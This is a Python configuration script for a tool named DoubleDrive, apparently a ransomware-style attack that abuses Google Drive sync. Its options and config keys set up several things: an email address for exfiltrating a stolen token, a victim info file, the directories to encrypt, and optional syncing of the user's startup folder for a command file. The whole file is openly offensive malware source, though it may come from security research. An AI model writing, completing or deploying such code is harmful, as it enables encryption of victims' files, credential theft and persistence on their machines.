import os
import argparse
import uuid
import yaml

from doubledrive.endpoint_takeover_utils.temp_email import TempEmail
from config import ConfigKey

def parse_args():
    parser = argparse.ArgumentParser(description="Options setup for Google Drive DoubleDrive")

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--temp-email", help="If specified, sets DoubleDrive to exfiltrate the token over a temp email", action="store_true")
    group.add_argument("--custom-email", help="If specified, sets DoubleDrive to exfiltrate the token over the specified email", type=str)

    parser.add_argument("--sync-startup-folder", help="If specified, set DoubleDrive to sync the user's startup folder as well", action="store_true")
    parser.add_argument("--target-paths", nargs="+", help="The list of directory paths to encrypt using Google Drive", type=str, required=True)

    return parser.parse_args()


def get_temp_email():
    temp_email = TempEmail()
    return f"{temp_email.username}@{temp_email.domain}"


def create_config_file_from_args(args):
    email_addr = None
    if args.temp_email:
        email_addr = get_temp_email()
    else:
        email_addr = args.custom_email


    config = {
        ConfigKey.EXFILTRATION_EMAIL_ADDRESS.value: email_addr,
        ConfigKey.IS_TEMP_EMAIL.value: args.temp_email,
        ConfigKey.VICTIM_INFO_FILE_NAME.value: str(uuid.uuid4()),
        ConfigKey.TARGET_PATHS.value: args.target_paths,
        ConfigKey.SHOULD_SYNC_STARTUP_FOLDER.value: args.sync_startup_folder,
    }

    if args.sync_startup_folder:
        config[ConfigKey.CMD_FILE.value] = str(uuid.uuid4())

    with open('config.yaml', 'w') as f:
        yaml.dump(config, f)


def main():
    args = parse_args()
    create_config_file_from_args(args)


if "__main__" == __name__:
    main()